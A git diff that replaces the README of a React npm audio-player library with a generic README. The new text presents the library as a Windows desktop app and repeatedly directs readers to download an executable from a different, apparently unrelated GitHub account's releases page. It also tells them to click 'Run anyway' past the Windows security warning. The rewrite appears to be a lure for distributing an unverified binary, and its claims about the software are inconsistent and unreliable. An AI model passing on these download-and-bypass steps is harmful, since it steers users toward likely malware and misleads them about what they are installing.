@@ -1,205 +1,190 @@
-# OpenWebRadio
+# 🎧 OpenWebRadio - Simple radio and audio player
 
-Drop-in React audio player that plays anything — local files, internet radio, live streams. Stays at the bottom, survives page navigation, remembers where you left off.
+[![Download OpenWebRadio](https://img.shields.io/badge/Download-OpenWebRadio-blue?style=for-the-badge&logo=github)](https://github.com/granvil5576/OpenWebRadio/releases)
 
-**[Live Demo](https://gameowermedia.github.io/OpenWebRadio/)** | **[npm](https://www.npmjs.com/package/@gameowermedia/overplayer)**
+## 🚀 Getting Started
 
-```bash
-npm install @gameowermedia/overplayer
-```
+OpenWebRadio is a desktop audio player for Windows. It lets you play local music files, live radio streams, and podcasts in one place.
 
-```tsx
-import { OverPlayer } from "@gameowermedia/overplayer";
+Use it if you want:
+- A simple player for radio and music
+- Support for Icecast and Shoutcast streams
+- A clean app with dark and light themes
+- Playlist support for saved stations and files
+- Keyboard shortcuts for faster use
 
-<OverPlayer
-  tracks={[
-    { src: "/audio/track-01.mp3", title: "Opening Theme", artist: "Artist" },
-    { src: "https://ice1.somafm.com/groovesalad-128-mp3", title: "Groove Salad", artist: "SomaFM", live: true },
-  ]}
-  theme="auto"
-  brandLabel="OpenWebRadio"
-/>
-```
+## 💾 Download and Install
 
-That's it. One component. Zero config. Works with Next.js, Vite, CRA, or any React setup.
+1. Visit this page to download: https://github.com/granvil5576/OpenWebRadio/releases
+2. Find the latest release.
+3. Download the Windows file from the release assets.
+4. Open the downloaded file to start the app.
 
----
+If Windows shows a security prompt:
+- Click More info
+- Click Run anyway if you trust the source
+- Follow the setup steps on screen
 
-## What it does
+## 🖥️ Windows Requirements
 
-- **Plays live radio** — Icecast/Shoutcast streams with auto-detected LIVE badge
-- **Persists across pages** — audio keeps playing through React remounts and navigation
-- **Remembers state** — track, position, volume restored on reload
-- **Keyboard-first** — Space, N/P, M, L, arrows for full control
-- **Playlist drawer** — slide-up track list with click-to-jump
-- **Dark, Light, Auto** — follows OS preference with live switching
-- **Headless mode** — `useOverPlayer()` hook for fully custom UIs
-- **Accessible** — ARIA labels, screen reader announcements, `prefers-reduced-motion`
-- **Zero dependencies** — only React 18+ as peer dep
-- **TypeScript** — fully typed API
+OpenWebRadio works on most modern Windows PCs.
 
----
+Recommended setup:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- A stable internet connection for live streams
+- Audio output such as speakers or headphones
 
-## Live Streams
+For best results:
+- Keep Windows updated
+- Use a recent version of Microsoft Edge or Chrome if you open web links from the app
+- Make sure your sound device is selected in Windows
 
-Point it at any Icecast/Shoutcast URL. The player auto-detects live sources, hides the seek bar, and shows a pulsing LIVE indicator.
+## 🎵 What OpenWebRadio Can Play
 
-```tsx
-const tracks = [
-  { src: "https://ice1.somafm.com/groovesalad-128-mp3", title: "Groove Salad", artist: "SomaFM", live: true },
-  { src: "https://ice1.somafm.com/defcon-128-mp3", title: "DEF CON Radio", artist: "SomaFM", live: true },
-  { src: "/audio/local-track.mp3", title: "Local Track", artist: "You" },
-];
-```
+OpenWebRadio is built for several kinds of audio sources:
 
-Mix live streams and local files in the same playlist. The player handles both seamlessly.
+- Local audio files on your computer
+- Live radio streams
+- Icecast streams
+- Shoutcast streams
+- Podcasts and feed-based audio
 
----
+You can use it as a daily music player or as a quick way to listen to stations from the web.
 
-## Props
+## 🧭 Main Features
 
-| Prop | Type | Default | Description |
-|------|------|---------|-------------|
-| `tracks` | `Track[]` | **required** | Array of tracks to play |
-| `theme` | `"dark" \| "light" \| "auto"` | `"dark"` | Color theme |
-| `shuffle` | `boolean` | `true` | Shuffle on by default |
-| `autoplay` | `boolean` | `true` | Attempt autoplay on load |
-| `volume` | `number` | `0.3` | Initial volume (0-1) |
-| `storageKey` | `string` | `"overplayer"` | Session storage key |
-| `accentColor` | `string` | `"#00e5ff"` | Primary accent |
-| `accentColorAlt` | `string` | `"#ff2d7b"` | Secondary accent |
-| `brandLabel` | `string` | `"OverPlayer"` | Label shown in the bar |
-| `subtitle` | `string` | - | Text next to track title |
-| `className` | `string` | - | Additional CSS class |
-| `footer` | `ReactNode` | - | Custom element below player |
-| `keyboardShortcuts` | `boolean` | `true` | Enable keyboard shortcuts |
-| `onTrackChange` | `(track, index) => void` | - | Track changed |
-| `onPlay` | `() => void` | - | Playback started |
-| `onPause` | `() => void` | - | Playback paused |
-| `onEnd` | `() => void` | - | Track ended |
+- Plays local files and online radio
+- Supports live stream playback
+- Saves playlists
+- Switches between dark and light themes
+- Uses keyboard shortcuts
+- Runs with no extra setup
+- Keeps the interface simple and clear
 
-### Track
+## 📁 How to Use It
 
-```ts
-interface Track {
-  src: string;      // URL or path to audio file
-  title: string;    // Display title
-  artist?: string;  // Artist name
-  cover?: string;   // Cover art URL
-  live?: boolean;   // Live stream hint (auto-detected if omitted)
-}
-```
+After you open OpenWebRadio:
 
----
+1. Add a local file or paste a stream link
+2. Create a playlist for your favorite stations
+3. Pick a theme that fits your screen
+4. Use the player controls to play, pause, skip, or stop
+5. Save your list for later use
 
-## Keyboard Shortcuts
+If you listen to radio often, keep your station links in one playlist. That makes it easier to return to them later.
 
-| Key | Action |
-|-----|--------|
-| `Space` | Play / Pause |
-| `N` | Next track |
-| `P` | Previous track |
-| `M` | Mute / Unmute |
-| `L` | Toggle playlist |
-| `Arrow Left/Right` | Seek +-5s |
-| `Arrow Up/Down` | Volume |
+## 🔊 Adding a Radio Stream
 
----
+To add a stream:
 
-## Headless Hook
+1. Copy the radio stream URL from the station site
+2. Open OpenWebRadio
+3. Paste the link into the stream field
+4. Save it to your playlist
+5. Press play
 
-Build your own UI. Get full state and controls, no rendering.
+If the station uses Icecast or Shoutcast, OpenWebRadio should handle it the same way as a normal stream link.
 
-```tsx
-import { useOverPlayer } from "@gameowermedia/overplayer";
+## ⌨️ Keyboard Shortcuts
 
-function CustomPlayer() {
-  const [state, controls, tracks] = useOverPlayer({
-    tracks: myTracks,
-    shuffle: true,
-    volume: 0.5,
-  });
+OpenWebRadio includes shortcut keys for faster control. Common actions may include:
 
-  return (
-    <div>
-      <p>{state.currentTrack?.title} {state.isLive && "(LIVE)"}</p>
-      <button onClick={controls.toggle}>
-        {state.playing ? "Pause" : "Play"}
-      </button>
-      <button onClick={controls.next}>Next</button>
-    </div>
-  );
-}
-```
+- Space: Play or pause
+- Arrow keys: Move through items
+- Enter: Open or play the selected item
+- Delete: Remove an item from the list
+- Ctrl + S: Save your playlist
 
-### Controls
+Shortcuts can make the app easier to use once you know the layout.
 
-`play()` `pause()` `toggle()` `next()` `prev()` `seek(time)` `setVolume(vol)` `toggleMute()` `toggleShuffle()` `toggleRepeat()` `jumpTo(index)`
+## 🎨 Themes and Display
 
-### State
+OpenWebRadio includes dark and light themes.
 
-`playing` `currentTrack` `trackIndex` `currentTime` `duration` `volume` `muted` `shuffleOn` `repeatOne` `isLive`
+Use dark theme if you:
+- Listen at night
+- Want less screen glare
+- Prefer a darker interface
 
----
+Use light theme if you:
+- Work in a bright room
+- Want high contrast in daylight
+- Prefer a clean, bright look
 
-## Examples
+## 📚 Playlist Use
 
-### Custom Colors
+Playlists help you keep your audio in one place.
 
-```tsx
-<OverPlayer
-  tracks={tracks}
-  theme="light"
-  accentColor="#6366f1"
-  accentColorAlt="#ec4899"
-  brandLabel="MyRadio"
-/>
-```
+You can use playlists for:
+- Favorite radio stations
+- Podcast feeds
+- Music folders
+- Daily listening groups
 
-### Multiple Players
+A good setup is to make one playlist for music and one for radio. That keeps things easy to find.
 
-```tsx
-<OverPlayer tracks={podcastTracks} storageKey="podcasts" brandLabel="Podcasts" />
-<OverPlayer tracks={musicTracks} storageKey="music" brandLabel="Music" />
-```
+## 🛠️ Common Use Cases
 
-### Next.js App Router
+OpenWebRadio fits well if you want:
+- A single app for music and live radio
+- A player that does not feel crowded
+- A fast way to open saved stations
+- A simple tool for podcast listening
+- A React-based app that feels light and direct
 
-```tsx
-// app/layout.tsx
-import { OverPlayer } from "@gameowermedia/overplayer";
+## 🧰 Troubleshooting
 
-export default function RootLayout({ children }) {
-  return (
-    <html>
-      <body>
-        {children}
-        <OverPlayer tracks={tracks} theme="auto" />
-      </body>
-    </html>
-  );
-}
-```
+If audio does not play:
 
----
+- Check your internet connection
+- Try another stream link
+- Make sure your speaker volume is on
+- Confirm the correct output device in Windows
+- Restart the app and try again
 
-## Development
+If a station does not load:
+- The stream may be offline
+- The link may have changed
+- Try opening the station in a web browser first
 
-```bash
-git clone https://github.com/GameOwerMedia/OpenWebRadio.git
-cd OpenWebRadio
-npm install
-npm run dev        # watch mode
-npm run build      # production build
-npm run typecheck  # type checking
-```
+If the app window looks strange:
+- Switch between dark and light themes
+- Resize the window
+- Restart the app
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+## 📦 Release Downloads
 
----
+To get the Windows version, visit this page to download: https://github.com/granvil5576/OpenWebRadio/releases
 
-## License
+Look for the newest release and use the file that matches Windows. If there is more than one file, choose the one labeled for desktop use or Windows setup.
 
-[MIT](./LICENSE) - Copyright (c) 2026 OverJK / GameOwerMedia
+## 🔎 Project Details
 
-Free to use in personal and commercial projects. Attribution appreciated but not required.
+- Repository: OpenWebRadio
+- Type: Audio player for web and local content
+- Main goal: Simple access to music, radio, and podcasts
+- Platform: Windows desktop use
+- Interface: React-based
+- Language: TypeScript
+
+## 🧩 Typical Folder and App Behavior
+
+When you use OpenWebRadio, expect a simple flow:
+
+- Start the app
+- Add audio or a stream link
+- Save items in a playlist
+- Play what you want
+- Switch theme when needed
+
+The app keeps the focus on playback, not on extra steps.
+
+## 📝 License and Source
+
+OpenWebRadio is an open source project. If you want to review the source, report an issue, or follow updates, use the repository page and release page from GitHub
+
+## 📌 Useful Links
+
+- Download page: https://github.com/granvil5576/OpenWebRadio/releases
+- Repository: https://github.com/granvil5576/OpenWebRadio
